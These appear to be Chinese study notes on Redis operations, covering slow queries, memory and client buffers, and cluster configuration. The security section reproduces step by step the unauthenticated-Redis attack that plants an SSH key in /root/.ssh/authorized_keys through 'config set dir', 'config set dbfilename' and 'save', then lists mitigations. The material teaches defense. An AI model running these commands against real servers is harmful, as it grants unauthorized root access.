**慢查询**：在Redis执行时耗时超过某个阈值的命令，称为慢查询。

![1653129590210](.\images\1653129590210.png)



**慢查询的危害**：由于Redis是单线程的，当客户端发出请求后，它们都会进入到Redis底层的工作队列中来执行，如果此时正在执行慢查询，执行命令所花费的时间就非常久，同一时刻如果有大量命令进入要执行，由于主线程底层正在执行慢查询，那么这些命令就会被阻塞，若阻塞太长时间超时就会报错。

因此我们需要去找到这些慢查询，并解决这些慢查询。

那哪一些查询属于慢查询呢？



**慢查询的阈值可以通过配置指定：**

* **`slowlog-log-slower-than`**：慢查询阈值，单位是微秒。默认是10000，也就是10毫秒。建议修改为1000，也就是1毫秒。

也就是说，在默认情况下，超过10毫米的查询都属于慢查询。

慢查询会放入到慢查询的日志中，日志的长度有上限，可以通过配置指定：

* `slowlog-max-len`：慢查询日志（本质是一个队列）的长度。默认是128，建议修改为1000。

我们可以使用config get与config set命令分别去获取与设置这两个参数的值：

![1653130457771](.\images\1653130457771.png)

![1653130475979](.\images\1653130475979.png)



**如何查看慢查询？**

知道了以上内容之后，我们该如何查看慢查询列表呢？

查看慢查询日志列表的命令：

* **`slowlog len`**：查询慢查询日志长度
* **`slowlog get [n]`**：读取n条慢查询日志信息
* **`slowlog reset`**：清空慢查询列表

如图：

慢查询日志结果中，每一行代表的含义如下所示：

![1653130858066](.\images\1653130858066.png)

我的慢查询结果：

<img src=".\images\image-20240717095650314.png" alt="image-20240717095650314" style="zoom:67%;" /> 

slowlog get命令，将慢查询信息按照时间顺序进行倒序排列，即先将最近一次的慢查询日志信息查询出来。

那么，我的最近一次慢查询就是INFO ALL命令，日志编号为1，表示该慢查询是第二个慢查询，慢查询的时间戳为1721147653，所花费的时间为237204微秒，也就是23毫秒，执行该命令的客户端IP和端口号为192.168.110.5:12362，客户端名称为""，也就是没有配置客户端名称。



我们也可以在可视化界面直接查看Redis的慢查询日志信息：

<img src=".\images\image-20240717100952308.png" alt="image-20240717100952308" style="zoom:67%;" />

![image-20240717101053371](.\images\image-20240717101053371.png)  



> **慢查询解决方案**
>
> 我们应该避免出现慢查询，比如当我们在慢查询日志中看到了类似于INFO ALL或者keys *等命令时，这些命令所花费的时间都会比较长，都属于慢查询，我们应该去禁用这些命令。
>
> 如果在慢查询日志中发现了类似于Hash等操作集合类型数据的命令时，说明此时的集合数据结构不合理，比如hash数据中存在几百万条数据，此时去操作该数据就可能是慢查询，该key就是一个BigKey，此时我们应该去优化该数据的数据结构，将其进行拆分。





---

### 命令与安全配置

当我们使用ssh访问远程的Linux系统时，我们需要输入用户名与密码进行身份验证，身份验证成功以后才能访问。

ssh给我们了免登录功能，它会生成一个公钥和私钥，将私钥放在本地，公钥放在Linux系统中，这样一来当我们去访问Linux时，就会使用本地的私钥与服务器的公钥进行验证，验证通过后就认为当前用户是一个可信任的用户，就允许访问，这样就不需要再输入用户名与密码。

**ssh免密登录实现过程**

首先，我们先不使用ssh免登录的方式来进行访问：

在本地输入命令：

```sh
ssh root@192.168.110.101
```

表示使用root用户去访问192.168.110.101路径的Linux服务器。

<img src=".\images\image-20240717110521272.png" alt="image-20240717110521272" style="zoom:67%;" />  

可以发现，此时需要输入密码才能够实现登录。



那么，我们现在来实现一下ssh免密登录，首先需要在本地生成ssh公钥和私钥，使用命令：

```sh
ssh-keygen –t rsa
```

生成ssh公钥与私钥文件，生成的ssh公钥私钥会存放在当前用户目录下的.ssh目录中：

<img src=".\images\image-20240717110711636.png" alt="image-20240717110711636" style="zoom:80%;" /> 

那我们也需要去Linux服务器中/root目录下，创建一个.ssh目录：

```sh
mkdir .ssh
```

然后，复制公钥文件到Linux系统中的.ssh目录下，并将该公钥文件改名为authorized_keys：

```sh
mv id_rsa.pub authorized_keys
```

这样一来，我们在Linux系统中的公钥就设置完毕了，此时我们就可以在本地使用ssh免密登录直接访问Linux服务器了，不需要再输入密码：

![image-20240717111553472](.\images\image-20240717111553472.png) 





**问题说明**

在上述过程，我们先去登录到Linux服务器中，然后将公钥放在指定位置，才能在本地去访问Linux服务器，也就是说我们必须知道Linux服务器的密码，先登录并将公钥传输过去以后，才能实现ssh免密登录，这是安全的。

但是，Redis存在一个漏洞，在不用登录Linux服务器的前提下，就可以将公钥送到Linux服务器中从而实现ssh免密登录。

漏洞重现：

将本地公钥写入到foo.txt文件中：

```sh
(echo -e "  "; cat id_rsa.pub; echo -e "  ") > foo.txt
```

然后再连接Redis，并将foo.txt文件中的数据写入到Redis中：

```shell
cat foo.txt | redis-cli -h 192.168.110.101 -x set crackit
```

然后登陆Redis，并将工作目录修改为/root/.ssh/目录下：

```sh
$ edis-cli -h 192.168.110.101
$ 192.168.110.101:6379> config set dir /root/.ssh/
OK
```

然后修改RDB持久化保存的文件名称，将其修改为authorized_keys：

```sh
$ 192.168.110.101:6379> config set dbfilename "authorized_keys"
OK
```

这样一来，当我们进行RDB持久化时，保存的文件名称就叫做authorized_keys，此时进行一下RDB持久化：

```sh
$ 192.168.110.101:6379> save
OK
```

这样就可以成功的将自己的公钥写入到/root/.ssh文件夹的authorized_keys文件里，然后攻击者直接执行：

```sh
ssh -i id_rsa root@192.168.110.101
```

即可远程利用自己的私钥登录该服务器。



**该漏洞出现的核心原因有以下几点：**

1. Redis暴露在公网上；
2. Redis未设置密码；
3. 利用了Redis的config set命令动态修改Redis配置；
4. 使用了root账号权限启动Redis。



> **解决漏洞方案**
>
> 1. Redis一定要设置密码；
>
> 2. 禁止线上使用下面命令：keys、flushall、flushdb、config set等命令。可以利用`rename-command`禁用；
>
>    例如：rename-command config 3hahd83h3ohf98sdf，就表示以后的config命令不再使用config启动，而是使用3hahd83h3ohf98sdf这一段字符串来表示。
>
> 3. bind：限制网卡，禁止外网网卡访问。
>
>    我们可以在redis.conf文件中，使用bind绑定公司的内网，这样一来只有公司内部网络才能访问。
>
> 4. 开启防火墙。
>
> 5. 不要使用root账户启动Redis。
>
> 6. Redis尽量不要使用默认的端口。
>
>    默认端口是6379，可以修改成其他的端口比如6388，这样就可以减少被攻击的风险。











---

### 内存划分和内存配置

当Redis内存不足时，可能导致Key频繁被删除，因为内存满时会自动删除一部分key。还可能导致响应时间变长、QPS（每秒处理请求数）不稳定等问题。当内存使用率达到90%以上时就需要我们警惕，并快速定位到内存占用的原因。

#### Redis内存介绍

**在Redis中，内存可以划分为三种类型：**

![image-20240717115810449](.\images\image-20240717115810449.png) 

1. **第一种内存类型：数据内存**。

数据内存存储Redis的键值信息。主要可能发生的问题就是**BigKey问题、内存碎片问题**。

**BigKey问题**我们可以通过修改Key的数据类型，修改业务的分配来解决。

> **内存碎片问题**是在内存分配的过程中产生的。
>
> **原因一：Redis采用的内存分配策略是`jemalloc`，内存分配器是按照`固定大小`来分配内存的，并不是完全按照程序申请的内存大小来进行分配。**
>
> 比如程序申请一个20字节的内存，内存分配器会分配一个32字节的内存空间，再比如，某个key需要10个字节，此时就会分配16个字节，那么多出来的6个字节就不能被使用了，这6个字节就是内存碎片。Redis会申请不同大小的内存空间来存储不用类型的数据，由于内存按照固定大小分配会比实际申请的内存要大一些，这个过程中会产生内存碎片。
>
> **原因二：数据不断删除和新增时，内存中空出来的位置可能无法完全匹配新数据的大小，导致产生未被利用的"碎片"空间，这就是内存碎片。**
>
> 比如删除了一个占用比较大空间的hash数据，那么该数据的空间就会空出来，此时放入了一个较小的数据，那么新数据无法将原数据占用的空间完全占据，此时就会空出来一部分空间，这部分空间就是内存碎片。
>
> 那么，随着时间的发展，内存碎片就会越来越多，无效的内存空间也会越来越大，那么，我们该如何解决内存碎片问题？
>
> **重启Redis时内存碎片就会被回收**。所以，要想解决内存碎片问题，我们只需要定期重启Redis服务器即可，当然，也不能暴力地直接重启Redis服务，我们应该按照主从或者集群分批进行重启，避免Redis服务故障，要在确保Redis服务可用性的前提下进行重启。
>
> 故：**`建议定期重启Redis服务器来使内存碎片得到定期回收。`**

2. **第二种内存类型：进程内存**

这部分内存是Redis主进程运行所占用的内存，如代码、常量池等，类似于Java虚拟机，跑起来肯定是需要占用内存的。这部分内存大约占用几MB，不会有太大的波动，在大多数生成环境中与Redis数据占用的内存相比可以忽略不计。

所以基本上不需要考虑该部分内存问题。

3. **第三种内存类型：缓冲区内存**

缓冲区内存中一般包含客户端缓冲区、AOF缓冲区、复制缓冲区等。客户端缓冲区又包括输入缓冲区和输出缓冲区两种。这部分内存占用波动较大，不当使用BigKey，可能导致内存溢出。

当出现了内存使用率较大的情况，需要考虑该部分内存的影响。

> 综上所述，当内存使用率较高时，可能会导致Redis中的key频繁被删除、响应时间变长以及每秒处理请求数不稳定等情况。此时，我们需要去考虑**数据内存**以及**缓冲区内存**这两部分内存所带来的影响。
>



#### 查看内存的命令

那我们该如何去查看不同模块内存的占用呢？

**Redis提供了一些命令，可以查看到Redis目前的内存分配状态：**

* **`info memory`**
* **`memory xxx`**（xxx可以为`usage`，表示查看某个key的内存占用；可以为`status`，表示统计在Redis中不同模块的内存占用）

**info memory命令结果**：

<img src=".\images\1653132073570.png" alt="1653132073570" style="zoom:67%;" /> 

**memory status命令结果：**

<img src=".\images\1653132098823.png" alt="1653132098823" style="zoom:67%;" /> 

可以看到这两个命令中，有很多内容都是一样的，比如：

在info memory结果中`used_memory`表示当前Redis占用的总内存，则在memory status中使用total.allocated表示；

在info memory中`used_memory_peek`表示Redis的峰值内存；在memory中也有peek.allocated参数与之对应；

在info memory中`used_memory_startup`表示Redis的进程内存；在memory status中有startup.allcated与之对应。





#### 内存缓冲区配置

Redis内存中，最可能出现问题的两大模块是**`数据内存模块`**以及**`缓冲区内存模块`**。

**数据内存模块**中，最可能出现的问题是BigKey问题以及内存碎片问题，这两个问题我们已经分析过了，之前也已经讲过该如何解决，这里就不再阐述。

那么，现在关键的是缓冲区内存模块存在的问题该如何定位与解决。

**内存缓冲区常见的有三种：**

1. **复制缓冲区**

主从复制的repl_backlog_buf，也就是我们之前所学习的环形数组。该缓冲区中记录的是主节点中执行的最新命令，并且也保存了主节点和从节点的offset，在进行增量同步时，会将主节点与从节点offset之间的差异同步给从节点，而后从节点就会去执行同步的命令，从而实现主从数据的同步。

**如果repl_backlog_buf太小的话，可能会因为主节点中执行的命令非常容易地覆盖从节点中未被同步的数据，而导致频繁的全量复制，影响性能。通过``repl_backlog-size`来设置，默认是`1mb`。**

该缓冲区的大小是固定的，不会存在波动，所以不会占用太多的内存空间，对内存不会有什么影响。



2. **AOF缓冲区**

AOF持久化刷盘之前的缓冲区域，类似于MySQL中将binlog写入到binlog cache缓冲区，也就是在将数据写入到磁盘之前的中间存放位置。

AOF也会去执行bgrewrite，也就是重写操作，会将AOF文件中的命令进行重写，减少其占用的空间，重写时一部分数据也需要缓存起来，这部分数据也是存放在AOF缓冲区中。

这部分缓冲区就是给AOF使用的，无法设置容量上限。

该AOF缓冲区中存放的仅仅只是AOF持久化时的命令，数据量也不会太多，而且AOF的速度也比较快，所以该部分缓冲区虽然没有设置上限，但不会占用太多内存。



综上所述，基本上复制缓冲区与AOF缓冲区基本上不会出现问题，最可能出现问题的是客户端缓冲区。



3. **客户端缓冲区**

客户端，也就是所有与Redis建立连接的客户端，它们要与Redis建立通信，发送命令并且接收执行结果，因此在这一过程中就需要建立一个缓冲区。

当客户端发送命令给Redis时，Redis需要将该命令缓存起来存入到**`输入缓冲区`**中；Redis执行完命令后，需要将结果返回给客户端，会将结果存入到**`输出缓冲区`**中，然后再将结果发送给客户端。



* **输入缓冲区**最大是1GB，并且不能配置，所以不需要担心输入缓冲区的内存溢出问题，只有当主线程被阻塞时，客户端的命令全部都存入到输入缓冲区中，导致输入缓冲区的大小大于1GB，此时，Redis会与客户端断开连接，停止接收命令，因为此时就表示Redis处理不过来了。所以，我们**不需要担心输入缓冲区的内存溢出问题**，只需要我们控制好不要出现大量的慢查询即可。



* **输出缓冲区**是Redis处理完命令后，先将结果存入到该缓冲区，然后再将结果发送给客户端。输出缓冲区可以设置大小，使用下面的命令进行配置：

  ![1653132410073](.\images\1653132410073.png)

  * `<class>`：表示客户端类型。对于不同类型的客户端，可以配置不同的输出缓冲区限制。
    * normal表示普通客户端，比如使用Java去连接Redis。
    * replica表示主从复制客户端，从节点进行主从同步时建立的连接就是主从复制客户端。
    * pubsub表示发布订阅客户端，当使用Redis中发布订阅的机制时就会建立发布订阅客户端。

  * `<hard limit>`：表示该类型客户端的输出缓冲区上限。当该类型客户端的输出缓冲区所占用的内存达到hard limit值时，就会立即断开与客户端的连接。

  * `<soft limit> <soft seconds>`：soft limit也是该类型客户端的输出缓冲区上限，只不过当输出缓冲区所占内存大小超过该soft limit值后，与客户端的连接不会立即断开，而是持续了soft seconds后才会断开连接。

在默认的情况下，`normal客户端`的hard limit、soft limit以及soft seconds三个值都是0，也就是说normal客户端没有设置输出缓冲区的上限。那么这样一来，当发给客户端的请求都是BigKey时，此时命令执行的结果内容非常多，并且由于网络带宽有限，响应给客户端的结果也比较有限，此时输出缓冲区的大小就会越来越大，有可能将Redis的内存全部占满了。

**normal客户端输出缓冲区过大的解决方案**

1. 给normal客户端的输出缓冲区设置上限，避免其所占内存越来越大；
2. 适当增加物理机的带宽，加快网络传输的速度，避免出现因大量数据的缓存而导致Redis崩溃；
3. 尽快找到相关问题业务进行限流操作。

而对于replica客户端与pubsub客户端都设置了输出缓冲区的内存上限，所以不需要担心这两种客户端的输出缓冲区出现占用内存过多的问题。



**那该如何定位到出现问题的客户端呢？**

我们可以使用的**`client list`**命令去查看所有的客户端信息：

![image-20240718003637528](.\images\image-20240718003637528.png) 

上图中存在两个Redis客户端，IP地址分别为192.168.110.5与127.0.0.1，其中比较关键的信息是qbuf、qbuf-free，表示输入缓冲区；obl、oll与omem表示输出缓冲区。

当输出缓冲区出现问题时，omem就会变得非常大，当我们要去查看客户端的输出缓冲区是否存在问题时，只需要查看该参数即可。

以上就是我们查看客户端的输出缓冲区是否溢出的方式。







**总结**

当Redis内存使用率过高时，可能会导致Key频繁被删除、响应时间变长以及QPS不稳定等问题，此时我们需要去解决内存存在的问题。

Redis内存中可能出现问题是两种内存：**`数据内存`**与**`缓冲区内存`**：

* `数据内存`存储的是**Redis键值信息**，该部分可能会出现**BigKey问题**以及**内存碎片问题**。对于BigKey，我们可以通过优化BigKey的数据结构以及业务结构来解决；对于内存碎片，我们可以通过定期重启Redis服务的方式来回收内存碎片。

* `缓冲区内存`包括复制缓冲区、AOF缓冲区以及客户端缓冲区，一般出现问题的是客户端缓冲区。客户端缓冲区分为**输入缓冲区**和**输出缓冲区**。

  * `输入缓冲区`最大为1G并且不能设置，当主线程被慢查询阻塞时，此时会有大量的命令涌入到输入缓冲区，当缓冲区所占的内存大小大于1GB时，Redis就会与客户端断开连接，所以**一般不用担心输入缓冲区占据太大的内存**；

  * `输出缓冲区`可以手动设置大小，当处理大量的Big value命令时，会导致输出内容过多，这些输出结果会占用输出缓冲区。**在默认情况下普通类型的Redis客户端normal没有设置缓冲区上限**，所以输出缓冲区占用的内存大小就是无上限的，随着输出缓冲区占用越来越多的内存，Redis内存有可能都被占满，从而直接导致Redis宕机。

    解决方案：

    1. 给normal客户端的输出缓冲区设置上限，避免其所占内存越来越大；
    2. 适当增加物理机的带宽，加快网络传输的速度，避免出现因大量数据的缓存而导致Redis崩溃；
    3. 尽快找到相关问题业务进行限流操作。







---

### 集群配置

集群虽然具备高可用性特性，能实现自动故障恢复，但是如果使用不当，也会存在一些问题：

* 集群完整性问题
* 集群带宽问题
* 数据倾斜问题
* 客户端性能问题
* 命令的集群兼容性问题
* lua和事务问题



**问题1：集群完整性问题**

**在Redis的默认配置中，如果发现任意一个插槽不可用，则整个集群都会停止对外服务。**

![1653132740637](.\images\1653132740637.png) 

在Redis的配置中，`cluster-require-full-coverage`意思是集群是否要保证插槽全覆盖，默认设置为yes，也就是说在默认情况下插槽一个都不能少，当Redis集群中16000多个插槽有一个不能使用，那么整个集群都不再对外服务了。

比如，集群中存在5个节点，每个节点都分配了一部分插槽，假设有一个节点挂了，那么此时整个集群都不能再使用了，这样实际是有点浪费的，Redis是基于数据完整性的考虑才会存在这样的逻辑。

但是实际生产活动中，我们更加看重的是Redis的可用性，部分插槽失效只是部分业务出现问题，应该保证其余业务正常运行，一个节点宕机时应该让其余正常运作的节点继续工作，而不是整体都停止服务。

> **建议将`cluster-require-full-coverage`配置为`no`。修改后当部分插槽出现问题，其余插槽可以正常运作。通过该配置去牺牲集群部分数据完整性，来提高集群的可用性。**





**问题2：集群带宽问题**

集群节点之间会不断的互相ping来确定集群中其他节点的状态。每次ping携带的信息至少包括：

* 插槽信息
* 集群状态信息

集群中节点越多，集群状态信息数据量也越大，10个节点的相关信息可能达到1KB，此时每次集群互通需要的带宽非常高，这样会导致集群中的大量带宽都会被ping信息所占用，这是一个非常可怕的问题，所以我们需要去解决这样的问题。

解决方案：

* 避免大集群，集群节点数不要太多，最少小于1000，越少越好，如果业务庞大，则建立多个集群。

* 避免在单个物理机中运行太多Redis实例。

* 配置合适的cluster-node-timeout值，该参数表示节点心跳失败的超时时间，超过该时间没有响应就认为该节点疑似宕机了，一般会每隔cluster-node-timeout / 2就会去ping一次。

  该参数值越大，就表示节点之间ping的间隔就越长，所占用的带宽就越小，但是如果太大，发现节点故障所需的时间就越长，集群的可用性就会降低。该参数值越小，则ping间隔时间就越小，所占用的带宽就会越大，但是集群的可用性就会越高。

  因此，需要配置合适的cluster-node-timeout值，不宜过大过小。



**问题3：数据倾斜问题**

当实例中出现BigKey，或者批处理时key使用了相同的有效部分，都会导致某一个节点占用了过多内存，从而导致部分节点负担过重，部分节点负担过少。





**问题4：客户端性能问题**

当我们配置了集群以后，无论是使用Jedis还是Lettuce去访问客户端时，都需要在集群中进行节点的选择、读写分离的判断、插槽的判断等等，这些操作会对客户端的性能带来影响。



**问题5：命令的集群兼容性问题**

有关这个问题之前已经讨论过的，当我们使用批处理命令时，Redis要求我们的key必须落在相同的slot上，然后大量的key同时操作时，是无法完成的，所以客户端必须对这样的数据进行处理，通过对key进行slot值的分组，对每组的命令进行批处理来解决这一问题。这些方案已经在《批处理命令优化》中讨论过了，在这里不再阐述。



**问题6：Lua和事务问题**

lua是通过将所有命令作为一个任务放到工作队列中执行来保证原子性的，如果那你要执行的key不在同一个节点，那么就无法将要执行的key放在同一个节点的工作队列中，也就无法保证lua的执行和事务的特性的，所以**`在集群模式中是没有办法执行lua和事务的`**。



**那到底是集群还是主从？**

单体Redis（或主从Redis）已经能够达到万级别的QPS，并且也具备很强的高可用性。如果主从能够满足业务需求的情况下，尽量不搭建Redis集群。
